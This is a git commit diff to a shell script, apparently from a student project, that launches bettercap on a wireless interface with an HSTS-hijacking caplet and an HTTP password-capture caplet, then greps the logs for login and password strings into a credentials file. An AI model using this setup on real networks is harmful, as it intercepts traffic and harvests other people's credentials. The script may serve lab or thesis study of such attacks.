66520ba660af798d65e0a8d640c4bc66aaea9ad3
jolo2734 <bartek.matejuk.szkola@gmail.com>
2022-02-02 00:17:56 +0000

    add hstshijack caplet

--- bettercap/start_bettercap.sh
+++ bettercap/start_bettercap.sh
@@ -5,7 +5,7 @@ sudo rm /home/ubuntu/credentials-bettercap/*
 grep -in -E "pass|login|password|user" /home/ubuntu/bettercap-logs/* > /home/ubuntu/credentials-bettercap/credentials_$(date +%d-%m-%Y_%I:%M%p).txt
 
 #Regeneracja capletu hstshijack
-sudo cp -r /home/ubuntu/hstshijack /usr/local/share/bettercap/caplets
+sudo cp -r /home/ubuntu/inzynierka/bettercap/hstshijack /usr/local/share/bettercap/caplets
 
 #uruchomienie programu bettercap
 sudo /home/ubuntu/bettercap-2.32.0/bettercap -iface wlan0 -caplet /home/ubuntu/inzynierka/bettercap/http_passwords.cap  > /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).txt
